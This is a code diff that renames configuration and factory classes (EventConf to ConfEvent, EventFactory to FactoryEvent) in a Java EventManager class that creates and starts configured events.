@@ -13,6 +13,7 @@ import java.util.Map;
 
 import com.android.service.Manager;
 import com.android.service.auto.Cfg;
+import com.android.service.conf.ConfEvent;
 import com.android.service.util.Check;
 
 /**
@@ -35,7 +36,7 @@ public class EventManager extends Manager<BaseEvent, Integer, String> {
 			synchronized (EventManager.class) {
 				if (singleton == null) {
 					singleton = new EventManager();
-					singleton.setFactory(new EventFactory());
+					singleton.setFactory(new FactoryEvent());
 				}
 			}
 		}
@@ -51,7 +52,7 @@ public class EventManager extends Manager<BaseEvent, Integer, String> {
 	 *            : Agent ID
 	 * @return the requested agent or null in case of error
 	 */
-	private BaseEvent createEvent(final String type, final EventConf conf) {
+	private BaseEvent createEvent(final String type, final ConfEvent conf) {
 
 		if (running.containsKey(conf.getId()) == true) {
 			return running.get(type);
@@ -73,7 +74,7 @@ public class EventManager extends Manager<BaseEvent, Integer, String> {
 	 */
 	@Override
 	public synchronized boolean startAll() {
-		HashMap<Integer, EventConf> events;
+		HashMap<Integer, ConfEvent> events;
 
 		events = status.getEventsMap();
 
@@ -91,12 +92,12 @@ public class EventManager extends Manager<BaseEvent, Integer, String> {
 			return false;
 		}
 
-		final Iterator<Map.Entry<Integer, EventConf>> it = events.entrySet().iterator();
+		final Iterator<Map.Entry<Integer, ConfEvent>> it = events.entrySet().iterator();
 
 		while (it.hasNext()) {
-			final Map.Entry<Integer, EventConf> pairs = it.next();
+			final Map.Entry<Integer, ConfEvent> pairs = it.next();
 
-			final EventConf conf = pairs.getValue();
+			final ConfEvent conf = pairs.getValue();
 			final String type = conf.getType();
 			
 			if (Cfg.DEBUG) {
